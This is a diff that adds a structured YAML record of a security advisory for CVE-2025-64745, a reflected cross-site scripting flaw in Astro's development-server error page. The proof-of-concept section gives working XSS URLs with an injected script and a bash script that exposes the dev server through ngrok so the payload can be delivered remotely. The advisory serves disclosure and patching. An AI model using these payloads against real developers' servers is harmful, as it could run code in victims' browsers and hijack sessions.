@@ -1,0 +1,292 @@
+advisory_id: GHSA-w2vj-39qv-7vh7
+datasource_id: github_osv/GHSA-w2vj-39qv-7vh7
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-w2vj-39qv-7vh7/GHSA-w2vj-39qv-7vh7.json
+aliases:
+  - CVE-2025-64745
+summary: |
+  Astro development server error page is vulnerable to reflected Cross-site Scripting
+  ## Summary
+
+  A Reflected Cross-Site Scripting (XSS) vulnerability exists in Astro's development server error pages when the `trailingSlash` configuration option is used. An attacker can inject arbitrary JavaScript code that executes in the victim's browser context by crafting a malicious URL. While this vulnerability only affects the development server and not production builds, it could be exploited to compromise developer environments through social engineering or malicious links.
+
+  ## Details
+
+  ### Vulnerability Location
+
+  https://github.com/withastro/astro/blob/5bc37fd5cade62f753aef66efdf40f982379029a/packages/astro/src/template/4xx.ts#L133-L149
+
+  ### Root Cause
+
+  The vulnerability was introduced in commit `536175528` (PR #12994) , as part of a feature to "redirect trailing slashes on on-demand rendered pages." The feature added a helpful 404 error page in development mode to alert developers of trailing slash mismatches.
+
+  **Issue**: The `corrected` variable, which is derived from the user-controlled `pathname` parameter, is directly interpolated into the HTML without proper escaping. While the `pathname` variable itself is escaped elsewhere in the same file (line 114: `escape(pathname)`), the `corrected` variable is not sanitized before being inserted into both the `href` attribute and the link text.
+
+  ### Attack Vector
+
+  When a developer has configured `trailingSlash` to `'always'` or `'never'` and visits a URL with a mismatched trailing slash, the development server returns a 404 page containing the vulnerable template. An attacker can craft a URL with JavaScript payloads that will be executed when the page is rendered.
+
+  ## PoC
+
+  ### Local Testing (localhost)
+
+  Basic vulnerability verification in local development environment
+
+  <details>
+  <summary>Show details</summary>
+
+  `astro.config.mjs`:
+  ```javascript
+  import { defineConfig } from 'astro/config';
+
+  export default defineConfig({
+    trailingSlash: 'never', // or 'always'
+    server: {
+      port: 3000,
+      host: true
+    }
+  });
+  ```
+
+  `package.json`:
+  ```json
+  {
+    "name": "astro-xss-poc-victim",
+    "version": "0.1.0",
+    "scripts": {
+      "dev": "astro dev"
+    },
+    "dependencies": {
+      "astro": "5.15.5"
+    }
+  }
+  ```
+
+  Start the development server:
+  ```bash
+  npm install
+  npm run dev
+  ```
+
+  Access the following malicious URL depending on your configuration:
+
+  **For `trailingSlash: 'never'`** (requires trailing slash):
+  ```
+  http://localhost:3000/"></code><script>alert(document.domain)</script><!--/
+  ```
+
+  **For `trailingSlash: 'always'`** (no trailing slash):
+  ```
+  http://localhost:3000/"></code><script>alert(document.domain)</script><!--
+  ```
+
+  When accessing the malicious URL:
+  1. The development server returns a 404 page due to trailing slash mismatch
+  2. The JavaScript payload (`alert(document.domain)`) executes in the browser
+  3. An alert dialog appears, demonstrating arbitrary code execution
+
+  </details>
+
+  ### Remote Testing (ngrok)
+
+  Reproduce realistic attack scenario via external malicious link
+
+  <details>
+  <summary>Show details</summary>
+
+  Prerequisites: ngrok account and authtoken configured (`ngrok config add-authtoken <key>`)
+
+  Setup and Execution:
+  ```bash
+  #!/bin/bash
+  set -e
+
+  mkdir -p logs
+
+  npm i
+  npm run dev > ./logs/victim.log 2>&1 &
+
+  ngrok http 3000 > ./logs/ngrok.log 2>&1 &
+
+  sleep 3
+
+  NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | grep -o '"public_url":"https://[^"]*' | head -1 | cut -d'"' -f4)
+  echo ""
+  echo "=== Attack URLs ==="
+  echo ""
+  echo "For trailingSlash: 'never' (requires trailing slash):"
+  echo "${NGROK_URL}/\"></code><script>alert(document.domain)</script><!--/"
+  echo ""
+  echo "For trailingSlash: 'always' (no trailing slash):"
+  echo "${NGROK_URL}/\"></code><script>alert(document.domain)</script><!--"
+  echo ""
+  wait
+  ```
+
+  When a remote user accesses either of the generated attack URLs:
+  1. The request is tunneled through ngrok to the local development server
+  2. The development server returns a 404 page due to trailing slash mismatch
+  3. The JavaScript payload (`alert(document.domain)`) executes in the user's browser
+
+  Both URL patterns work depending on your `trailingSlash` configuration ('never' or 'always').
+
+  </details>
+
+  ## Impact
+
+  This only affects the **development server**. Risk depends on how and where the dev server is exposed.
+
+  ### Security impact
+
+  * **Developer environment compromise**: Visiting a crafted URL can run arbitrary JS in the developer's browser.
+  * **Session hijacking**: Active developer sessions can be stolen if services are open in the browser.
+  * **Local resource access**: JS may probe `localhost` endpoints or dev tools depending on browser policies.
+  * **Supply-chain risk**: Malicious packages or CI that start dev servers can widen exposure.
+
+  ### Attack scenarios
+
+  * **Social engineering**: Malicious link sent to a developer triggers the XSS when opened.
+  * **Malicious documentation**: Attack URLs embedded in issues, PRs, chat, or docs.
+  * **Dependency/CI abuse**: Packages or automation that spawn public dev servers expose many targets.
+impacted_packages:
+  - purl: pkg:npm/astro
+    affected_versions: vers:npm/>=5.2.0|<5.15.6
+    fixed_versions: vers:npm/5.15.6
+    affected_packages:
+      - pkg:npm/astro@5.2.0
+      - pkg:npm/astro@5.2.1
+      - pkg:npm/astro@5.2.2
+      - pkg:npm/astro@5.2.3
+      - pkg:npm/astro@5.2.4
+      - pkg:npm/astro@5.2.5
+      - pkg:npm/astro@5.2.6
+      - pkg:npm/astro@5.3.0
+      - pkg:npm/astro@5.3.1
+      - pkg:npm/astro@5.4.0
+      - pkg:npm/astro@5.4.1
+      - pkg:npm/astro@5.4.2
+      - pkg:npm/astro@5.4.3
+      - pkg:npm/astro@5.5.0
+      - pkg:npm/astro@5.5.1
+      - pkg:npm/astro@5.5.2
+      - pkg:npm/astro@5.5.3
+      - pkg:npm/astro@5.5.4
+      - pkg:npm/astro@5.5.5
+      - pkg:npm/astro@5.5.6
+      - pkg:npm/astro@5.6.0
+      - pkg:npm/astro@5.6.1
+      - pkg:npm/astro@5.6.2
+      - pkg:npm/astro@5.7.0
+      - pkg:npm/astro@5.7.1
+      - pkg:npm/astro@5.7.2
+      - pkg:npm/astro@5.7.3
+      - pkg:npm/astro@5.7.4
+      - pkg:npm/astro@5.7.5
+      - pkg:npm/astro@5.7.6
+      - pkg:npm/astro@5.7.7
+      - pkg:npm/astro@5.7.8
+      - pkg:npm/astro@5.7.9
+      - pkg:npm/astro@5.7.10
+      - pkg:npm/astro@5.7.11
+      - pkg:npm/astro@5.7.12
+      - pkg:npm/astro@5.7.13
+      - pkg:npm/astro@5.7.14
+      - pkg:npm/astro@5.8.0
+      - pkg:npm/astro@5.8.1
+      - pkg:npm/astro@5.8.2
+      - pkg:npm/astro@5.9.0
+      - pkg:npm/astro@5.9.1
+      - pkg:npm/astro@5.9.2
+      - pkg:npm/astro@5.9.3
+      - pkg:npm/astro@5.9.4
+      - pkg:npm/astro@5.10.0
+      - pkg:npm/astro@5.10.1
+      - pkg:npm/astro@5.10.2
+      - pkg:npm/astro@5.11.0
+      - pkg:npm/astro@5.11.1
+      - pkg:npm/astro@5.11.2
+      - pkg:npm/astro@5.12.0
+      - pkg:npm/astro@5.12.1
+      - pkg:npm/astro@5.12.2
+      - pkg:npm/astro@5.12.3
+      - pkg:npm/astro@5.12.4
+      - pkg:npm/astro@5.12.5
+      - pkg:npm/astro@5.12.6
+      - pkg:npm/astro@5.12.7
+      - pkg:npm/astro@5.12.8
+      - pkg:npm/astro@5.12.9
+      - pkg:npm/astro@5.13.0
+      - pkg:npm/astro@5.13.1
+      - pkg:npm/astro@5.13.2
+      - pkg:npm/astro@5.13.3
+      - pkg:npm/astro@5.13.4
+      - pkg:npm/astro@5.13.5
+      - pkg:npm/astro@5.13.6
+      - pkg:npm/astro@5.13.7
+      - pkg:npm/astro@5.13.8
+      - pkg:npm/astro@5.13.9
+      - pkg:npm/astro@5.13.10
+      - pkg:npm/astro@5.13.11
+      - pkg:npm/astro@5.14.0
+      - pkg:npm/astro@5.14.1
+      - pkg:npm/astro@5.14.3
+      - pkg:npm/astro@5.14.4
+      - pkg:npm/astro@5.14.5
+      - pkg:npm/astro@5.14.6
+      - pkg:npm/astro@5.14.7
+      - pkg:npm/astro@5.14.8
+      - pkg:npm/astro@5.15.0
+      - pkg:npm/astro@5.15.1
+      - pkg:npm/astro@5.15.2
+      - pkg:npm/astro@5.15.3
+      - pkg:npm/astro@5.15.4
+      - pkg:npm/astro@5.15.5
+    fixed_packages:
+      - pkg:npm/astro@5.15.6
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/withastro/astro
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/withastro/astro
+        commit: 790d9425f39bbbb462f1c27615781cd965009f91
+        patch_text:
+      - vcs_url: https://github.com/withastro/astro
+        commit: 5bc37fd5cade62f753aef66efdf40f982379029a
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '2.7'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-w2vj-39qv-7vh7/GHSA-w2vj-39qv-7vh7.json
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-79
+references:
+  - url: https://github.com/withastro/astro
+    reference_type:
+    reference_id:
+  - url: https://github.com/withastro/astro/blob/5bc37fd5cade62f753aef66efdf40f982379029a/packages/astro/src/template/4xx.ts#L133-L149
+    reference_type:
+    reference_id:
+  - url: https://github.com/withastro/astro/commit/790d9425f39bbbb462f1c27615781cd965009f91
+    reference_type:
+    reference_id:
+  - url: https://github.com/withastro/astro/pull/12994
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-64745
+    reference_type:
+    reference_id: CVE-2025-64745
+  - url: https://github.com/withastro/astro/security/advisories/GHSA-w2vj-39qv-7vh7
+    reference_type:
+    reference_id: GHSA-w2vj-39qv-7vh7
+exploits: []
